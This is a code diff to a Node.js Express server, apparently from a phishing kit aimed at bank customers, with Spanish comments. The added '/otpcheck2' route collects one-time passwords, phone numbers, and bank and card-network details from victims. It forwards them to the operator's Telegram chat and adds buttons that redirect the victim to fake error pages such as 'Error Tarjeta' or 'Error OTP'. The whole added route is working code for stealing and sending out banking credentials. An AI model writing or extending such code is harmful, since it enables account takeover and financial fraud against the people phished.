@@ -193,6 +193,55 @@ app.post('/otpcheck', async (req, res) => {
     res.status(500).send({ ok: false, error: 'telegram_send_failed' });
   }
 });
+app.post("/otpcheck2", async (req, res) => {
+  const { otp, sessionId, info } = req.body;
+
+  if (!otp || !sessionId || !info) {
+    return res.status(400).send("Datos incompletos");
+  }
+
+  try {
+    // Mensaje que se enviará al canal de Telegram
+    const mensaje = `
+🔐 *NUEVO OTP INGRESADO* 🔐
+------------------------
+*OTP:* ${otp}
+*Número:* ${info?.number || "Desconocido"}
+*Banco:* ${info?.checkerInfo?.bank || "N/A"}
+*Franquicia:* ${info?.checkerInfo?.company || "N/A"}
+`;
+
+    // Botones para redirección dinámica
+    const buttons = {
+      inline_keyboard: [
+        [
+          { text: "Error Tarjeta", callback_data: "redirect_to:payment.html" },
+          { text: "Error Logo", callback_data: "redirect_to:id_check.html" }
+        ],
+        [
+          { text: "Error OTP", callback_data: "redirect_to:otp-check2.html" },
+          { text: "Finalizar", callback_data: "redirect_to:finish.html" }
+        ]
+      ]
+    };
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje,
+        parse_mode: "Markdown",
+        reply_markup: buttons
+      })
+    });
+
+    return res.sendStatus(200);
+  } catch (error) {
+    console.error("Error enviando a Telegram:", error);
+    return res.sendStatus(500);
+  }
+});
 
 
 
